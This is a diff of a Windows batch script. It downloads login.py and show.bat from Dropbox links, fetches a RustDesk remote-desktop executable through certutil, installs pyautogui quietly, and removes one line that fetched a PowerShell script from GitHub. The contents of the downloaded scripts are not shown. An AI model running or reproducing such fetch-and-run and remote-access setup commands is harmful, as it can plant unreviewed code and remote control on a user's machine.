@@ -1,6 +1,5 @@
 @echo off
 curl -L -o login.py https://www.dropbox.com/scl/fi/aznj0fx1k1c6qq4cha38r/login.py?rlkey=xvp2vxu5x1mtblkxnp75j1ejh&st=nv8naqll&dl=0
-curl -L -o loop.ps1 https://raw.githubusercontent.com/SachithDilshan404/Photos-rep/main/loop.ps1
 curl -L -o show.bat https://www.dropbox.com/scl/fi/6qszf9ljg3utjwaicsiu3/show.bat?rlkey=6cadbqmvnztutbk7eha1rpm66&st=88c1ifxs&dl=0
 certutil -urlcache -split -f "https://github.com/rustdesk/rustdesk/releases/download/1.2.1/rustdesk-1.2.1-x86_64.exe" rustdesk.exe
 pip install pyautogui --quiet
